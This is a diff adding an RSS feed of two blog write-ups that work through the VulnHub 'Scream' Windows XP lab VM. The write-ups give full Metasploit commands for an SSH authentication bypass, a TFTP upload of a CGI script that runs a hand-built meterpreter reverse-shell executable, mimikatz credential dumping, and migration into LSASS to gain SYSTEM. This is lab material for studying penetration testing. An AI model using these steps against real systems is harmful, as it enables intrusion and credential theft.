@@ -1,0 +1,286 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Scream on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/scream/</link>
+    <description>Recent content in Scream on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 16 May 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/scream/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Scream - Method 1 (Short/Easy)</title>
+      <link>http://rastamouse.me/writeups/2014/scream-method-1/</link>
+      <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/scream-method-1/</guid>
+      <description>
+
+&lt;p&gt;Scream is a vulnerable VM running Windows XP SP2, created with the Scream VulnInjector from VulnHub.&lt;/p&gt;
+
+&lt;p&gt;Whilst doing this challenge, I found two methods of gaining SYSTEM.  The first was very straight-forward and rather short, which is why I also chose to publish the longer / harder method.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:c150a9147d793c0d75f30b58e4630592&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A 192.168.127.130
+ 
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x 1 ftp ftp              0 May 15 18:15 bin
+| drwxr-xr-x 1 ftp ftp              0 May 15 18:15 log
+|_drwxr-xr-x 1 ftp ftp              0 May 15 18:15 root
+|_ftp-bounce: bounce working!
+22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
+|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
+23/tcp open  domain  ISC BIND login
+|_dns-nsid: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http    Tinyweb httpd 1.93
+|_http-methods: No Allow or Public header in OPTIONS response (status code 403)
+|_http-title: The Scream - Edvard Munch
+
+Running: Microsoft Windows 2000|XP
+OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
+OS details: Microsoft Windows 2000 SP4, Microsoft Windows XP SP2 or SP3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I Googled the SSH Service Banner and the very first result mentioned a &amp;lsquo;FreeSSHD Remote Authentication Bypass Zeroday Exploit&amp;rsquo;, for which a Metapsloit Module was available.&lt;/p&gt;
+
+&lt;h2 id=&#34;metasploit:c150a9147d793c0d75f30b58e4630592&#34;&gt;Metasploit&lt;/h2&gt;
+
+&lt;p&gt;Fire up &lt;code&gt;msfconsole&lt;/code&gt;&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/windows/ssh/freesshd_authbypass  
+msf exploit(freesshd_authbypass) &amp;gt; set RHOST 192.168.127.130
+msf exploit(freesshd_authbypass) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(freesshd_authbypass) &amp;gt; set LHOST 192.168.127.127
+msf exploit(freesshd_authbypass) &amp;gt; set LPORT 443
+msf exploit(freesshd_authbypass) &amp;gt; show options
+ 
+Module options (exploit/windows/ssh/freesshd_authbypass):
+
+   Name       Current Setting                                              Required  Description
+   ----       ---------------                                              --------  -----------
+   RHOST      192.168.127.130                                              yes       The target address
+   RPORT      22                                                           yes       The target port
+   USERNAME                                                                no        A specific username to try
+   USER_FILE  /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt  yes       File containing usernames, one per line
+ 
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     192.168.127.127  yes       The listen address
+   LPORT     443             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Freesshd &amp;lt;= 1.2.6 / Windows (Universal)
+ 
+msf exploit(freesshd_authbypass) &amp;gt; exploit
+ 
+[*] Started reverse handler on 192.168.127.127:443
+[*] Trying username &#39;4Dgifts&#39;
+[*] Trying username &#39;EZsetup&#39;
+[*] Trying username &#39;OutOfBox&#39;
+[*] Trying username &#39;ROOT&#39;
+[*] Trying username &#39;adm&#39;
+[*] Trying username &#39;admin&#39;
+[*] Uploading payload, this may take several minutes...
+[*] Sending stage (769536 bytes) to 192.168.127.130
+[*] Meterpreter session 1 opened (192.168.127.127:443 -&amp;gt; 192.168.127.130:1041)
+ 
+meterpreter &amp;gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Scream - Method 2 (Longer/Harder)</title>
+      <link>http://rastamouse.me/writeups/2014/scream-method-2/</link>
+      <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/scream-method-2/</guid>
+      <description>
+
+&lt;h2 id=&#34;ftp:ed63a6c7e568009db84b215907f6385d&#34;&gt;FTP&lt;/h2&gt;
+
+&lt;p&gt;As we can see from the original &lt;code&gt;Nmap&lt;/code&gt; scan in Method 1, there is an FTP service which allows anonymous read access to part of the file system.  Peeking inside the &lt;code&gt;bin&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt; folders, gives us a good indication that this where the &lt;code&gt;TinyWeb&lt;/code&gt; service is running, however we have no write access.&lt;/p&gt;
+
+&lt;h2 id=&#34;tftp:ed63a6c7e568009db84b215907f6385d&#34;&gt;TFTP&lt;/h2&gt;
+
+&lt;p&gt;A UDP &lt;code&gt;Nmap&lt;/code&gt; scan showed the port 69 (TFTP) may be open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sU -sV 192.168.127.130
+69/udp open  tftp?
+1 service unrecognized despite returning data.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The problem with TFTP is there is no way to know which remote directory the service is bound to, and we therefore have no idea where the files are going to go.  I created a very basic HTML page and uploaded it via TFTP.&lt;/p&gt;
+
+&lt;p&gt;Using the web service and the FTP access, I could confirm the file was written to the &lt;code&gt;root&lt;/code&gt; folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# vi test.html
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;p&amp;gt;This is a test.&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+root@kali:~# tftp 192.168.127.130
+tftp&amp;gt; put test.html
+Sent 58 bytes in 0.0 seconds
+
+root@kali:~# ftp 192.168.127.130
+ftp&amp;gt; ls root
+200 Port command successful
+150 Opening data channel for directory list.
+drwxr-xr-x 1 ftp ftp              0 Feb 08  2013 cgi-bin
+---------- 1 ftp ftp          14539 Oct 31  2012 index.html
+---------- 1 ftp ftp             63 May 16 13:56 test.html
+&lt;/code&gt;&lt;/pre&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/scream/test.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;tinyweb-cgi:ed63a6c7e568009db84b215907f6385d&#34;&gt;TinyWeb CGI&lt;/h2&gt;
+
+&lt;p&gt;I went and downloaded TinyWeb from RITLabs and found that within their download package, they had some example files for CGI applications.&lt;/p&gt;
+
+&lt;p&gt;I uploaded a few of these to the &lt;code&gt;cgi-bin&lt;/code&gt; folder via TFTP and execucated them via &lt;code&gt;cURL&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# cp scream/tinyweb/cgi/HELLO.PL /root/hello.pl
+
+root@kali:~# tftp 192.168.127.130
+tftp&amp;gt; put cgi-bin/hello.pl
+Sent 330 bytes in 0.0 seconds
+
+root@kali:~# curl http://192.168.127.130/cgi-bin/hello.pl
+Hello, World!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next test was to see if I could upload a CGI script that would run an executable (i.e. a Meterpreter payload&amp;hellip;).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# cp scream/tinyweb/cgi/helloexe.pl /root/exploit.pl
+change line --&amp;gt; print `exploit.exe`;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;payload:ed63a6c7e568009db84b215907f6385d&#34;&gt;Payload&lt;/h2&gt;
+
+&lt;p&gt;Now to make the exploit, but there&amp;rsquo;s an added complication.  I found that normal PE32 executables created by msfpayload would not execute on the remote host, and if you examine the doscgi.exe file (in the cgi examples in the tinyweb download) you can see it&amp;rsquo;s an MS-DOS executable.&lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s no option in &lt;code&gt;msfpayload&lt;/code&gt; or &lt;code&gt;msfencode&lt;/code&gt; to do this as far as I can tell, so it has to be done manually.&lt;/p&gt;
+
+&lt;p&gt;The first stage is to produce a raw payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.127.127 R &amp;gt; exploit_raw&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then convert this into ASM format using Disassemble Ruby library.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# ruby /usr/share/metasploit-framework/lib/metasm/samples/disassemble.rb /root/exploit_raw &amp;gt; /root/exploit_asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;There are two lines we have to manually add to the top of this file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# vi exploit_asm 
+.section &#39;.text&#39; rwx
+.entrypoint
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then finally encode this into the final executable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ruby /usr/share/metasploit-framework/lib/metasm/samples/peencode.rb /root/exploit_asm
+saved to file &amp;quot;a.out&amp;quot;
+
+root@kali:~# mv a.out /root/exploit.exe
+
+root@kali:~# file exploit.exe
+exploit.exe: MS-DOS executable, MZ for MS-DOS
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;upload-and-execute:ed63a6c7e568009db84b215907f6385d&#34;&gt;Upload and Execute&lt;/h2&gt;
+
+&lt;p&gt;Upload these two files via TFTP, then start the Metasploit Multi Hander.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# tftp 192.168.127.130
+tftp&amp;gt; put cgi-bin/exploit.pl
+Sent 538 bytes in 0.0 seconds
+tftp&amp;gt; put cgi-bin/exploit.exe
+Sent 1028 bytes in 0.0 seconds
+
+root@kali:~# msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.127.127 E
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then used &lt;code&gt;cURL&lt;/code&gt; to execute the CGI script, which in turn executes the exe.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.127.130/cgi-bin/exploit.pl
+[*] Sending stage (769536 bytes) to 192.168.127.130
+[*] Meterpreter session 1 opened (192.168.127.127:4444 -&amp;gt; 192.168.127.130:1034)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;post-exploitation:ed63a6c7e568009db84b215907f6385d&#34;&gt;Post Exploitation&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; getuid
+Server username: SCREAM\alex
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Unlike in the previous method, where the SSH service was running as SYSTEM, the TinyWeb service is running as user &lt;code&gt;alex&lt;/code&gt;.  This means that some privilege escalation is now required.&lt;/p&gt;
+
+&lt;p&gt;First I loaded the Mimikaz extension, to find alex&amp;rsquo;s password stored in memory.  This wasn&amp;rsquo;t really necessary, as there aren&amp;rsquo;t any other services which I can authenticate to.  I just did it for the sake of completeness.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; load mimikatz 
+meterpreter &amp;gt; wdigest
+0;34668  NTLM       SCREAM        alex             thisisaverylongpassword
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All that&amp;rsquo;s required to elevate is to migrate the Meterpreter service into a process running as SYSTEM.  I attempted to migrate into 644 LSASS.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; migrate 664
+[*] Migrating from 3272 to 664...
+[*] Migration completed successfully.
+meterpreter &amp;gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
